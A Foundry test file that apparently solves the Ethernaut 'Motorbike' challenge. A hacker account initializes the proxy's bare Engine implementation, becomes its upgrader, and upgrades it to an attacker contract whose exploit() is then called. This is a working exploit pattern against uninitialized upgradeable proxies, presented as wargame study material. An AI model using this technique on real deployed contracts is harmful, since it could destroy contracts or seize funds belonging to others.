// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/25_Motorbike.sol";
import "contracts/25_Motorbike.sol";

contract AttackerMotorbikeTest is Test {
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function testMotorbike() external {
        vm.startPrank(owner);
        Engine engine = new Engine();
        AttackerEngine attackerEngine = new AttackerEngine();
        Motorbike motorbike = new Motorbike(address(engine));

        address addr = address(uint256(vm.load(address(motorbike), bytes32(uint256(_IMPLEMENTATION_SLOT)))));
        assertEq(addr, address(engine));

        vm.stopPrank();

        vm.startPrank(hacker);
        engine.initialize();
        assertEq(engine.upgrader(), hacker);

        engine.upgradeToAndCall(address(attackerEngine), abi.encodeWithSignature("exploit()"));
        attackerEngine.exploit();
    }
}
